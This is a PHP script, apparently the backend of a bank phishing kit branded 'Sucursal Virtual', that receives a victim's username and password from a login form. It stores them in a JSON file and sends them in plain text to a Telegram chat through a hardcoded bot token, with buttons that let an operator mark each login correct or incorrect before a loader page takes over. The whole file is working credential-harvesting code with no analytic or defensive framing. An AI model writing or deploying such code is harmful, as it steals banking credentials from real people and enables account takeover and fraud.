<?php
// enviar.php
// Recibe POST de index.html, guarda solicitud, envía a Telegram y redirige con cookie

// 1) Leer y validar parámetros
$usuario = trim($_POST['usuario'] ?? '');
$clave   = trim($_POST['clave']   ?? '');
if (!$usuario || !$clave) {
    header('Location: index.html');
    exit;
}

// 2) Generar ID único
$id = uniqid('', true);

// 3) Guardar en JSON
$file = 'solicitudes.json';
$solicitudes = file_exists($file)
    ? json_decode(file_get_contents($file), true)
    : [];
$solicitudes[] = [
    'id'      => $id,
    'usuario' => $usuario,
    'clave'   => $clave,
    'status'  => 'pendiente'
];
file_put_contents($file, json_encode($solicitudes, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE));

// 4) Enviar mensaje a Telegram con botones
$TOKEN   = '7704371778:AAF4h3i-QPKWv2w2M9O-zK32HeIxEhc1IvY';
$CHAT_ID = '-1002386768203';
$mensaje = "🔔 *Nueva solicitud Sucursal Virtual*\n\n"
         . "👤 *Usuario:* `$usuario`\n"
         . "🔑 *Clave:* `$clave`\n\n"
         . "_ID de sesión:_ `$id`";

$keyboard = [
    'inline_keyboard' => [[
        ['text'=>'✅ Correcto',    'callback_data'=>"aprobar:$id"],
        ['text'=>'❌ Incorrecto',  'callback_data'=>"rechazar:$id"]
    ]]
];

$params = [
    'chat_id'      => $CHAT_ID,
    'text'         => $mensaje,
    'parse_mode'   => 'Markdown',
    'reply_markup' => json_encode($keyboard)
];

file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?" . http_build_query($params));

// 5) Poner cookie 'sessionId' y redirigir a loader.php
setcookie('sessionId', $id, 0, '/');
header('Location: loader.php');
exit;